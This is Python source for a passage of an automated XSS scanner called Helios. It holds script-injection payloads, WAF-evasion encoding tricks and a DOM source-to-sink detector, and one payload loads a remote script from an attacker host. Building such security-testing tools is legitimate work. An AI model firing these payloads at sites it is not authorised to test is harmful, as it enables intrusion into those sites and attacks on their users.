import argparse
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
import urllib.parse
import uuid
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import WebDriverException
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import UnexpectedAlertPresentException
import asyncio
from aiohttp import ClientSession
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
from collections import deque
from functools import wraps
import concurrent.futures
import time
import threading
import shutil
import sys
import re
import random
import string
import warnings
import textwrap
import hashlib
import json
import uvloop
import aiohttp

warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)

session = ClientSession()

def banner():
    print(f'''
    



                                                                                    
 {bcolors.FAIL}∞                                                                         π      ∞ 
   ∞                     ∞                                                      ∞   
     ∞                                       π                                ∞     
      ∞∞            ∞                 ∞                                     ∞∞      
        ∞∞                          ∞∞∞∞∞∞∞∞∞∞∞∞                          ∞∞        
          ∞∞                 ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞                  ∞∞          
            ∞π            ∞∞∞∞∞∞∞∞∞∞∞          ∞∞∞∞∞∞∞∞∞∞∞            ∞∞         ∞  
              ∞ π      ∞∞π∞∞∞∞∞       ∞     π   π    ∞∞∞∞∞π∞∞       ∞∞        π     
   π            ∞   ∞∞∞∞∞∞∞π         πππππ∞ππ ∞   π      ∞∞∞∞∞∞π   ∞                
                  ∞∞∞∞∞∞    ∞    π∞  ππ∞π∞π     ππ∞π        ∞∞∞∞∞∞                  
                ∞∞∞∞∞∞   ∞  ∞ππ ∞        ππ       ∞ ππ∞       ∞∞∞∞∞                 
               ∞∞∞∞∞ ∞∞   πππ∞ ∞      ∞∞∞∞∞∞∞∞∞π     ∞ ∞∞∞   ∞∞ ∞∞∞∞∞    ∞π  ∞      
             π∞∞∞∞    π∞∞π       ∞∞∞∞π∞∞∞∞∞∞∞∞ π∞∞π    π π∞∞∞    π∞∞∞∞        ∞     
            ∞∞∞∞∞      ∞π∞∞    ∞∞∞∞∞  π∞    ∞  ∞∞∞∞∞∞π  π∞∞∞π      ∞∞∞∞π            
           ∞∞∞∞∞  ∞  πππ   ∞∞∞∞∞∞  ∞ ∞ ∞π   ∞ ∞ ∞  ∞π∞∞∞∞π  ∞ ∞     ∞∞∞∞            
          ∞∞∞∞∞     ππ π  ∞ ∞∞∞ ∞∞  ∞π ∞πππ∞∞  ∞  ∞ π∞∞∞      ∞∞     ∞∞∞∞           
          ∞∞∞∞    π ∞ π   ∞∞∞∞∞∞∞ ∞∞ ∞∞ ∞π∞∞π∞∞ ∞∞ ∞∞∞∞∞∞π    π∞∞     ∞∞∞∞          
      π  ∞∞∞∞  π∞ π∞     ∞∞∞∞∞∞π ∞∞ ∞∞∞π∞∞∞∞∞ ∞∞ ∞∞ ∞∞∞ππ∞∞    ππ  π   ∞∞∞∞         
         ∞∞∞π    π∞     ∞  ∞∞∞∞∞∞∞∞ππ∞∞∞∞∞∞∞∞∞∞πππ∞∞∞∞∞∞∞∞∞∞  ∞  π     ∞∞∞∞         
        π∞∞∞      π     ∞∞∞∞     ∞∞π∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞   ∞∞∞∞∞∞    ππ      ∞∞∞         
        ∞∞∞∞     π∞ ∞  ∞∞∞∞∞πππ∞∞∞π∞∞  {bcolors.BOLD}{bcolors.HEADER}HELIOS{bcolors.ENDC}{bcolors.FAIL}  ∞∞ ∞∞∞ππ∞∞∞π∞∞  π  ∞     ∞∞∞∞{bcolors.ENDC}        
 {bcolors.BOLD}∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ππ   ∞∞∞∞ ∞ππ∞∞{bcolors.BOLD}{bcolors.WARNING}v0.3{bcolors.ENDC}{bcolors.BOLD}ππππ∞π∞∞∞∞   ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞  
        ∞∞∞      ∞π    ∞∞∞∞πππππ∞∞ ∞∞∞∞∞∞∞∞π∞∞∞∞∞ ∞ππ∞∞∞∞∞∞∞∞   π ∞     π∞∞∞        
        ∞∞∞∞     ∞     π∞∞∞π∞∞∞∞∞∞  ππ∞∞∞∞π∞π∞π∞ ∞π∞∞∞∞∞∞∞∞∞∞     ∞     π∞∞∞        
        ∞∞∞∞     π     ∞∞∞∞∞   ∞∞∞∞∞ π∞∞∞∞∞ ∞∞π  ∞∞∞∞   ∞∞∞∞π π   ∞     ∞∞∞∞        
        ∞∞∞∞   π π∞     ∞∞∞∞∞∞∞  ∞∞ ∞ ∞∞∞π π∞∞ ∞∞∞∞ ∞∞∞∞∞∞∞π   π ∞π    ∞∞∞∞         
         ∞∞∞     ∞       ∞∞∞∞∞ ∞∞ ∞∞∞∞ π∞ ππ∞ π∞∞ ∞∞∞π∞∞∞∞∞     ∞∞ π   ∞∞∞∞         
         ∞∞∞∞  π   π      ∞ ∞∞∞ ∞∞∞ ∞ ∞∞∞π∞∞ ∞ ∞∞∞∞ ∞∞∞∞π∞     ππ∞     ∞∞∞          
          ∞∞∞∞  ∞   ∞      ∞∞∞∞∞π∞ ∞∞ ∞π∞∞∞∞π∞∞ ∞∞π ∞∞∞ππ   π  ππ     ∞∞∞∞          
           ∞∞∞∞    π∞∞π   ∞ ∞∞∞∞∞∞∞∞∞π∞ ∞π∞∞∞ ∞ ∞π∞∞∞∞∞∞   π  ∞∞     ∞∞∞∞           
         π  ∞∞∞∞   ∞ ∞ π  ∞    ∞∞∞∞∞∞∞ ∞∞∞∞∞∞ ∞∞∞∞∞π∞   ∞∞  ππ      ∞∞∞∞            
             ∞∞∞∞π     π∞ ∞       ∞∞∞∞∞∞π∞∞∞∞ ∞∞∞∞        ∞∞∞     ∞∞∞∞∞     ∞       
              ∞∞∞∞∞   ∞∞  ∞∞         ∞  ∞∞∞π  ∞         ∞π  π∞   ∞∞π∞∞              
                ∞∞∞∞∞π      π∞π   π      ∞π         ∞ππ ∞     π∞∞∞∞∞                
  ∞    π         π∞∞∞∞∞         π∞π  π∞  π   ∞∞π ∞ π         ∞∞∞∞∞                  
                ∞∞ π∞∞∞∞∞∞         ∞π    ππππ   ∞        π∞∞∞∞∞∞  ∞∞                
              ∞∞      ∞∞∞∞∞∞∞                         π∞∞∞∞∞∞∞      ∞∞              
            ∞∞           ∞∞∞π∞∞∞∞∞∞              ∞∞∞∞∞∞∞∞∞∞           ∞∞            
    π      ∞                π∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞π∞∞∞∞∞∞π                ∞π          
         ∞         ∞∞             ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞              π         ∞π        
       ∞                                            π             ∞         ∞       
     ∞π π                                  ∞                        ∞         ∞     
   ∞π                                                                 π         ∞   
 ∞∞                                                                               ∞{bcolors.ENDC}
                                                                                    
                            {bcolors.BOLD}{bcolors.WARNING}Helios - Automated XSS Scanner{bcolors.ENDC}
                    {bcolors.BOLD}{bcolors.PURPLE}Author: {bcolors.ENDC}{bcolors.BOLD}@stuub   |   {bcolors.BOLD}{bcolors.PURPLE}Github: {bcolors.ENDC}{bcolors.BOLD}https://github.com/stuub{bcolors.ENDC}


    ''')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    PARAM = '\033[96m'
    PURPLE = '\033[95m'

class BrowserNotFoundError(Exception):
    pass

class TamperTechniques:
    @staticmethod
    def double_encode(payload):
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def uppercase(payload):
        return ''.join(c.upper() if random.choice([True, False]) else c for c in payload)
    
    @staticmethod
    def hex_encode(payload):
        return ''.join(f'%{ord(c):02X}' for c in payload)
    
    @staticmethod
    def json_fuzz(payload):
        return json.dumps(payload)[1:-1]  # Remove quotes added by json.dumps
    
    @staticmethod
    def space_to_tab(payload):
        return payload.replace(' ', '\t')

def apply_tamper(payload, technique):
    if technique == 'doubleencode':
        return TamperTechniques.double_encode(payload)
    elif technique == 'uppercase':
        return TamperTechniques.uppercase(payload)
    elif technique == 'hexencode':
        return TamperTechniques.hex_encode(payload)
    elif technique == 'jsonfuzz':
        return TamperTechniques.json_fuzz(payload)
    elif technique == 'spacetab':
        return TamperTechniques.space_to_tab(payload)
    elif technique == 'all':
        tampered = payload
        for tech in ['doubleencode', 'uppercase', 'hexencode', 'jsonfuzz', 'spacetab']:
            tampered = apply_tamper(tampered, tech)
        return tampered
    else:
        return payload

class XSSScanner:
    def __init__(self, target_url, browser_type, headless, threads, custom_headers, cookies, output_file, payload_file, tamper):
        self.target_url = target_url
        self.headless = headless
        self.browser_type = browser_type.lower()
        self.browser_configs = {
            'chrome': {
                'executable': 'google-chrome',
                'driver_manager': ChromeDriverManager,
                'service': ChromeService,
                'options': ChromeOptions,
                'webdriver': webdriver.Chrome,
            },
            'chromium': {
                'executable': 'chromium',
                'driver_manager': lambda: ChromeDriverManager(chrome_type="chromium"),
                'service': ChromeService,
                'options': ChromeOptions,
                'webdriver': webdriver.Chrome,
            },
            'firefox': {
                'executable': 'firefox',
                'driver_manager': GeckoDriverManager,
                'service': FirefoxService,
                'options': FirefoxOptions,
                'webdriver': webdriver.Firefox,
            }
        }
        self.threads = threads
        self.custom_headers = custom_headers
        self.cookies = cookies
        self.output_file = output_file
        self.payload_file = payload_file
        self.tamper = tamper
        self.verbose = False
        self.skip_header_scan = False
        self.crawl = False
        self.crawl_depth = 2
        self.scanned_urls = set()
        self.discovered_urls = set()
        self.detected_wafs = []
        self.canary_string = uuid.uuid4().hex[:8]
        self.lock = threading.Lock()
        self.payload_identifiers = {}
        self.payloads = self.load_payloads()
        self.session = None
        self.driver = None 
        self.request_times = deque(maxlen=1000)
        self.vulnerabilities_found = []



    async def create_session(self):
            if self.session is None or self.session.closed:
                self.session = aiohttp.ClientSession(headers=self.custom_headers, cookies=self.cookies)

    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
            self.session = None

    async def cleanup(self):
        self.print_and_save("\n[*] Cleaning up...", important=True)
        self.stop_rps_monitor()
        if self.driver:
            await asyncio.to_thread(self.driver.quit)
        if self.session and not self.session.closed:
            try:
                await self.session.close()
            except Exception as e:
                self.print_and_save(f"[!] Error cleaning up: {str(e)}", important=True)
            finally:
                self.driver = None
        self.print_and_save("[*] Cleanup complete.", important=True)

    def setup_driver(self):
        if self.browser_type not in self.browser_configs:
            raise ValueError(f"Unsupported browser type: {self.browser_type}")

        config = self.browser_configs[self.browser_type]

        try:
            if not shutil.which(config['executable']):
                raise BrowserNotFoundError(f"{self.browser_type.capitalize()} is not installed or not in PATH.")

            options = config['options']()
            if self.headless:
                options.add_argument("--headless")

            service = config['service'](config['driver_manager']().install())
            driver = config['webdriver'](service=service, options=options)

            driver.get(self.target_url)
            for name, value in self.cookies.items():
                driver.add_cookie({'name': name, 'value': value})

            return driver

        except BrowserNotFoundError as e:
            self.print_and_save(f"[!] {str(e)}", important=True)
            self.print_and_save(f"[!] Please install {self.browser_type} and make sure it's in your system PATH.", important=True)
            return None

        except WebDriverException as e:
            if "executable needs to be in PATH" in str(e):
                self.print_and_save(f"[!] WebDriver not found for {self.browser_type}. Attempting to install...", important=True)
                try:
                    config['driver_manager']().install()
                    return self.setup_driver()  # Retry setup after installation
                except Exception as install_error:
                    self.print_and_save(f"[!] Failed to install WebDriver: {str(install_error)}", important=True)
            else:
                self.print_and_save(f"[!] Error setting up {self.browser_type} driver: {str(e)}", important=True)
            return None

    
    def start_rps_monitor(self):
        self.rps_monitor_running = True
        self.rps_thread = threading.Thread(target=self.rps_monitor)
        self.rps_thread.daemon = True
        self.rps_thread.start()
        self.rps_print_thread = threading.Thread(target=self.print_rps_continuously)
        self.rps_print_thread.daemon = True
        self.rps_print_thread.start()

    def stop_rps_monitor(self):
        self.rps_monitor_running = False
        if self.rps_thread:
            self.rps_thread.join(timeout=2)
        if self.rps_print_thread:
            self.rps_print_thread.join(timeout=2)

    def rps_monitor(self):
        while self.rps_monitor_running:
            current_time = time.time()
            one_second_ago = current_time - 1
            self.request_times = deque([t for t in self.request_times if t > one_second_ago], maxlen=1000)
            self.current_rps = len(self.request_times)
            time.sleep(0.1)  # Update every 100ms

    def print_rps_continuously(self):
        while self.rps_monitor_running:
            total_requests = len(self.request_times)
            sys.stdout.write(f"\r\033{bcolors.BOLD}[{bcolors.ENDC}{bcolors.PURPLE}RPS: {self.current_rps} | Total Requests: {total_requests}{bcolors.ENDC}{bcolors.BOLD}]")
            sys.stdout.flush()
            time.sleep(0.5)  # Update display every 500ms

    def log_request(self):
        with self.lock:
            self.request_times.append(time.time())
    
    async def smart_wait(self, timeout=10):
        try:
            await asyncio.wait_for(
                asyncio.to_thread(
                    lambda: WebDriverWait(self.driver, timeout).until(
                        EC.presence_of_element_located((By.TAG_NAME, "body"))
                    )
                ),
                timeout=timeout
            )
            await asyncio.wait_for(
                asyncio.to_thread(
                    lambda: WebDriverWait(self.driver, timeout).until(
                        lambda d: d.execute_script('return document.readyState') == 'complete'
                    )
                ),
                timeout=timeout
            )
        except asyncio.TimeoutError:
            self.print_and_save("[!] Timeout waiting for page to load", important=True)

    def trigger_events(self):
        elements = self.driver.find_elements(By.CSS_SELECTOR, 'button, a, input[type="submit"]')
        for element in elements:
            try:
                element.click()
                self.smart_wait()
                self.scan_current_state()
            except:
                pass

    def handle_client_side_routing(self):
        current_url = self.driver.current_url
        self.driver.execute_script("window.history.forward()")
        if self.driver.current_url != current_url:
            self.smart_wait()
            self.scan_current_state()

    def scan_current_state(self):
        results = []
        results.extend(self.scan_url_parameters())
        results.extend(self.scan_post_parameters())
        results.extend(self.scan_dom_content())
        return results

    def incremental_scan(self):
        self.scan_current_state()  # Quick initial scan
        
        new_states = self.discover_new_states()
        for state in new_states:
            self.navigate_to_state(state)
            self.scan_current_state()

    def discover_new_states(self):
        new_states = set()
        elements = self.driver.find_elements(By.CSS_SELECTOR, 'a[href^="#"], button, input[type="submit"]')
        for element in elements:
            try:
                current_url = self.driver.current_url
                element.click()
                self.smart_wait()
                if self.driver.current_url != current_url:
                    new_states.add(self.driver.current_url)
                self.driver.back()
                self.smart_wait()
            except:
                pass
        return new_states
    
    def navigate_to_state(self, state):
        self.driver.get(state)
        self.smart_wait()

    def cache_result(self, element, result):
        element_hash = hashlib.md5(element.get_attribute('outerHTML').encode()).hexdigest()
        self.result_cache[element_hash] = result

    def get_cached_result(self, element):
        element_hash = hashlib.md5(element.get_attribute('outerHTML').encode()).hexdigest()
        return self.result_cache.get(element_hash)

    def load_payloads(self):
        if self.payload_file:
            try:
                with open(self.payload_file, 'r') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                self.print_and_save(f"[*] Loaded {len(payloads)} payloads from {self.payload_file}")
                self.extract_payload_identifiers(payloads)
                return payloads
            except Exception as e:
                self.print_and_save(f"[!] Error loading payload file: {str(e)}", important=True)
                return self.generate_default_payloads()
        else:
            return self.generate_default_payloads()
    
    def extract_payload_identifiers(self, payloads):
        for payload in payloads:
            alert_content = re.search(r"alert\(['\"](.+?)['\"]", payload)
            if alert_content:
                self.payload_identifiers[alert_content.group(1)] = payload
            else:
                identifier = uuid.uuid4().hex[:8]
                self.payload_identifiers[identifier] = payload
        self.print_and_save(f"[*] Extracted {len(self.payload_identifiers)} unique payload identifiers")

    def generate_default_payloads(self):
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
    
    def generate_random_param(self, length=8):
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def customize_payload(self, payload):
        for identifier, original_payload in self.payload_identifiers.items():
            if payload == original_payload:
                unique_id = uuid.uuid4().hex[:8]
                if 'alert(' in payload:
                    customized = payload.replace('alert(', f'alert("{unique_id}"+')
                else:
                    customized = f"{payload}_{unique_id}"
                break
        else:
            customized = payload
        
        customized = customized.replace("alert('XSS')", "window.xss_test=true;alert('XSS')")

        if self.tamper:
            tampered = apply_tamper(customized, self.tamper)
            self.print_and_save(f"[*] Applied tamper technique '{self.tamper}': {tampered}")
            return tampered
        
        if 'alert(' in customized:
            customized = customized.replace("alert(", f"alert('{self.canary_string}'+")
        return customized

    def print_and_save(self, message, important=False):
        if self.verbose or important:
            with self.lock:
                message = self.color_parameters(message)
                lines = message.split('\n')
                for line in lines:
                    if important:
                        self.print_important(line)
                    else:
                        self.print_status(line)
                
                if self.output_file:
                    clean_message = self.remove_ansi_codes(message)
                    with open(self.output_file, 'a') as f:
                        f.write(clean_message + '\n')

    def color_parameters(self, message):
        return re.sub(r'(parameter:\s*)(\w+)', fr'\1{bcolors.PARAM}\2{bcolors.ENDC}', message)

    def remove_ansi_codes(self, message):
        return re.sub(r'\033\[[0-9;]*m', '', message)

    def print_status(self, message):
        self.terminal_width = shutil.get_terminal_size().columns
        if message.startswith('[*]'):
            colored_message = f"{bcolors.OKBLUE}[*]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[+]'):
            colored_message = f"{bcolors.OKGREEN}[+]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[!]'):
            colored_message = f"{bcolors.FAIL}[!]{bcolors.ENDC} {message[3:]}"
        else:
            colored_message = message

        wrapped_message = textwrap.fill(colored_message, self.terminal_width - 1)
        sys.stdout.write("\r" + " " * self.terminal_width + "\r")
        sys.stdout.write(wrapped_message + "\n")
        sys.stdout.flush()

    def print_important(self, message):
        self.terminal_width = shutil.get_terminal_size().columns
        if message.startswith('[*]'):
            colored_message = f"{bcolors.OKBLUE}[*]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[+]'):
            colored_message = f"{bcolors.OKGREEN}[+]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[!]'):
            colored_message = f"{bcolors.FAIL}[!]{bcolors.ENDC} {message[3:]}"
        else:
            colored_message = message

        wrapped_message = textwrap.fill(colored_message, self.terminal_width - 1)
        sys.stdout.write("\r" + " " * self.terminal_width + "\r")
        print(wrapped_message)
        sys.stdout.flush()

    async def scan_url_parameters(self):
        results = []
        parsed_url = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        for param, value in params.items():
            for payload in self.payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={urllib.parse.quote(payload)}")
                self.print_and_save(f"[*] Testing URL parameter: {param} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                if await self.test_payload(self.session, test_url, payload, "GET"):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in URL parameter: {param}", important=True)
        return results

    async def scan_dom_content(self):
        results = []
        self.print_and_save("[*] Scanning for DOM-based XSS vulnerabilities")
        async with self.session.get(self.target_url) as response:
            content = await response.text()
        soup = BeautifulSoup(content, 'html.parser')
        
        scripts = soup.find_all('script')
        for script in scripts:
            if script.get('src'):
                script_url = urllib.parse.urljoin(self.target_url, script['src'])
                await self.test_dom_xss(None, is_external=True, script_url=script_url)
            elif script.string:
                await self.test_dom_xss(script.string)

        for tag in soup.find_all(True):
            for attr in tag.attrs:
                if attr.lower().startswith('on'):
                    await self.test_dom_xss(tag[attr])
        return results

    async def fetch_external_script(self, url):
        try:
            async with self.session.get(url) as response:
                self.log_request()
                return await response.text()
        except Exception as e:
            self.print_and_save(f"[!] Error fetching external script {url}: {str(e)}", important=True)
            return None

    async def scan_headers(self):
        results = []
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        for header in headers_to_test:
            for payload in self.payloads:
                self.print_and_save(f"[*] Testing header: {header} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                test_headers = {header: payload}
                if await self.test_payload(self.session, self.target_url, payload, "GET", headers=test_headers):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in header: {header}", important=True)
        return results

    async def scan_post_parameters(self):
        results = []
        async with self.session.get(self.target_url) as response:
            content = await response.text()
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')

        for form_index, form in enumerate(forms):
            action = form.get('action', self.target_url)
            if not action.startswith(('http://', 'https://')):
                action = urllib.parse.urljoin(self.target_url, action)

            method = form.get('method', 'get').lower()
            if method != 'post':
                continue

            inputs = form.find_all('input')
            textareas = form.find_all('textarea')
            selects = form.find_all('select')

            params = {}
            for input_field in inputs + textareas + selects:
                name = input_field.get('name')
                if name:
                    params[name] = ''

            results.append(f"[*] Testing POST form {form_index + 1} with {len(params)} parameters")
            await self.test_post_params(action, params)

        return results

    async def test_post_params(self, url, params):
        for param in params:
            for payload in self.payloads:
                self.print_and_save(f"[*] Testing POST parameter: {param} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                test_params = params.copy()
                test_params[param] = payload
                if await self.test_payload(self.session, url, payload, "POST", data=test_params):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in {bcolors.BOLD}POST{bcolors.ENDC} parameter: {param}", important=True)
                    self.print_and_save(f"{bcolors.BOLD}Test Payload: {bcolors.OKGREEN}{payload}{bcolors.ENDC}", important=True)
                    self.print_and_save(f"{bcolors.BOLD}Test URL: {bcolors.OKGREEN}{url}{bcolors.ENDC}", important=True)
                    self.print_and_save(f"{bcolors.BOLD}Test Parameter: {bcolors.OKGREEN}{param}{bcolors.ENDC}", important=True)
    
    def generate_default_value(self, field_type):
        if field_type == 'email':
            return 'test@example.com'
        elif field_type == 'number':
            return '123'
        elif field_type == 'tel':
            return '1234567890'
        elif field_type == 'password':
            return 'Password123!'
        else:
            return 'Test Input'

    async def test_dom_xss(self, content, is_external=False, script_url=None):
        if is_external and script_url:
            self.print_and_save(f"[*] Analyzing external script: {script_url}")
            content = await self.fetch_external_script(script_url)
            if not content:
                return False

        sources = [
            "document.URL", "document.documentURI", "document.URLUnencoded", "document.baseURI",
            "location", "document.cookie", "document.referrer", "window.name",
            "history.pushState", "history.replaceState", "localStorage", "sessionStorage",
            "IndexedDB", "WebSQL", "FileSystem"
        ]
        sinks = [
            "eval", "setTimeout", "setInterval", "setImmediate", "execScript",
            "crypto.generateCRMFRequest", "ScriptElement.src", "ScriptElement.text",
            "ScriptElement.textContent", "ScriptElement.innerText",
            "anyTag.onEventName", "range.createContextualFragment",
            "crypto.generateCRMFRequest", "HTMLElement.innerHTML",
            "Document.write", "Document.writeln"
        ]

        for source in sources:
            for sink in sinks:
                pattern = re.compile(r'{}.*?{}'.format(re.escape(source), re.escape(sink)), re.IGNORECASE | re.DOTALL)
                if pattern.search(content):
                    location = "an external script" if is_external else "an inline script"
                    self.print_and_save(f"[+] Potential DOM XSS found in {location}: {bcolors.OKGREEN}{source} flowing into {sink}", important=True)
                    if is_external:
                        self.print_and_save(f"Script URL: {script_url}")
                    
                    exploit_info = await self.confirm_dom_xss(source, sink, is_external, script_url)
                    if exploit_info:
                        self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {bcolors.OKGREEN}{source} {bcolors.ENDC}into {bcolors.OKGREEN}{sink}{bcolors.ENDC}", important=True)
                        self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
                        return True

        vulnerable_patterns = [
            (r'document\.write\s*\(\s*.*\)', "document.write"),
            (r'\.innerHTML\s*=\s*.*', "innerHTML"),
            (r'\.outerHTML\s*=\s*.*', "outerHTML"),
            (r'\.insertAdjacentHTML\s*\(.*\)', "insertAdjacentHTML"),
            (r'execScript\s*\(.*\)', "execScript"),
            (r'setTimeout\s*\(.*\)', "setTimeout"),
            (r'setInterval\s*\(.*\)', "setInterval"),
        ]

        for pattern, func_name in vulnerable_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                location = "an external script" if is_external else "an inline script"
                self.print_and_save(f"[+] Potential DOM XSS vulnerability found in {location}: {bcolors.OKGREEN}{func_name}{bcolors.ENDC}", important=True)
                if is_external:
                    self.print_and_save(f"Script URL: {script_url}")
                
                exploit_info = await self.confirm_dom_xss(func_name, func_name, is_external, script_url)
                if exploit_info:
                    self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {func_name}", important=True)
                    self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
                    return True

        return False

    async def exploit_cookie_to_settimeout(self, source, sink):
        payloads = [
            f"document.cookie='xss=1;expires=Thu, 18 Dec 2023 12:00:00 UTC;path=/';setTimeout('alert(\"{self.canary_string}\")',100);",
            f"document.cookie='xss=1;expires=Thu, 18 Dec 2023 12:00:00 UTC;path=/';setTimeout(function(){{alert('{self.canary_string}')}},100);",
            f"document.cookie='xss=<img src=x onerror=setTimeout(()=>alert(\"{self.canary_string}\"),100)>;expires=Thu, 18 Dec 2023 12:00:00 UTC;path=/';"
        ]
        
        for payload in payloads:
            test_url = f"{self.target_url}#" + urllib.parse.quote(payload)
            self.print_and_save(f"[*] Testing DOM XSS (cookie to setTimeout) URL: {test_url}", important=True)
            
            if await self.test_single_payload(test_url, payload):
                return {'payload': payload, 'url': test_url}
        
        return None

    async def exploit_location_to_eval(self, source, sink):
        payloads = [
            f"javascript:eval('alert(\"{self.canary_string}\")')",
            f"javascript:eval(atob('YWxlcnQoInt7self.canary_string}}Iik='))",  # Base64 encoded payload
            f"javascript:eval('('+function(){{alert('{self.canary_string}')}}+')()')"
        ]
        
        for payload in payloads:
            test_url = f"{self.target_url}#" + urllib.parse.quote(payload)
            self.print_and_save(f"[*] Testing DOM XSS (location to eval) URL: {test_url}", important=True)
            
            if await self.test_single_payload(test_url, payload):
                return {'payload': payload, 'url': test_url}
        
        return None

    async def exploit_innerhtml(self, source, sink):
        payloads = [
            f"<img src=x onerror=alert('{self.canary_string}')>",
            f"<svg><script>alert('{self.canary_string}')</script></svg>",
            f"<iframe srcdoc=\"<script>alert('{self.canary_string}')</script>\"></iframe>"
        ]
        
        for payload in payloads:
            test_url = f"{self.target_url}#" + urllib.parse.quote(payload)
            self.print_and_save(f"[*] Testing DOM XSS (innerHTML) URL: {test_url}", important=True)
            
            if await self.test_single_payload(test_url, payload):
                return {'payload': payload, 'url': test_url}
        
        return None

    async def confirm_dom_xss(self, source, sink, is_external=False, script_url=None):
        exploitation_strategies = {
            ('document.cookie', 'setTimeout'): self.exploit_cookie_to_settimeout,
            ('location', 'eval'): self.exploit_location_to_eval,
            ('innerHTML', 'innerHTML'): self.exploit_innerhtml,
            # Add more source-sink pairs here
        }

        exploit_info = None
        exploit_method = exploitation_strategies.get((source, sink))
        
        if exploit_method:
            self.print_and_save(f"[*] Attempting specific exploit for source '{source}' and sink '{sink}'.", important=True)
            exploit_info = await exploit_method(source, sink)

        if not exploit_info:
            self.print_and_save(f"[*] Specific exploit not successful or not available. Trying general DOM XSS exploit method.", important=True)
            exploit_info = await self.general_dom_xss_exploit(source, sink)
        
        if exploit_info:
            vuln_info = self.generate_exploit_info(source, sink, exploit_info['payload'], exploit_info['url'], is_external, script_url)
            
            # Add the vulnerability to self.vulnerabilities_found
            self.vulnerabilities_found.append({
                'type': 'DOM XSS',
                'method': 'GET',  # DOM XSS is typically exploited via GET
                'url': exploit_info['url'],
                'payload': exploit_info['payload'],
                'parameter': 'N/A',  # DOM XSS doesn't always have a specific parameter
                'details': vuln_info
            })
            
            self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {source} into {sink}", important=True)
            self.print_and_save(f"[*] Exploit Information:\n{vuln_info}", important=True)
            return vuln_info
        else:
            self.print_and_save(f"[!] Could not generate exploit for source '{source}' and sink '{sink}'.", important=True)
        
        return None

    async def general_dom_xss_exploit(self, source, sink):
        payloads = [
            f"<img src=x onerror=alert('{self.canary_string}')>",
            f"javascript:alert('{self.canary_string}')",
            f"'><script>alert('{self.canary_string}')</script>",
            f"'-alert('{self.canary_string}')-'",
            f"\\'-alert('{self.canary_string}')-\\'",
            f"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://attacker.com/xss.js\\';document.body.appendChild(a)')",
            f"data:text/html;base64,PHNjcmlwdD5hbGVydCgne3NlbGYuY2FuYXJ5X3N0cmluZ319Jyk8L3NjcmlwdD4="
        ]

        parsed_url = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed_url.query)

        for payload in payloads:
            encoded_payload = urllib.parse.quote(payload)

            # Test adding the payload to existing parameters
            for param in query_params:
                test_params = query_params.copy()
                test_params[param] = [f"{test_params[param][0]}{encoded_payload}"]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
                
                self.print_and_save(f"[*] Testing DOM XSS URL: {test_url}", important=True)
                
                if await self.test_single_payload(test_url, payload):
                    return {'payload': payload, 'url': test_url}

            # Test adding a new parameter with the payload
            new_param = f"xss_test_{random.randint(1000, 9999)}"
            test_params = query_params.copy()
            test_params[new_param] = [encoded_payload]
            test_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
            
            self.print_and_save(f"[*] Testing DOM XSS URL with new parameter: {test_url}", important=True)
            
            if await self.test_single_payload(test_url, payload):
                return {'payload': payload, 'url': test_url}

            # Test adding the payload to the fragment identifier
            test_url = urllib.parse.urlunparse(parsed_url._replace(fragment=encoded_payload))
            
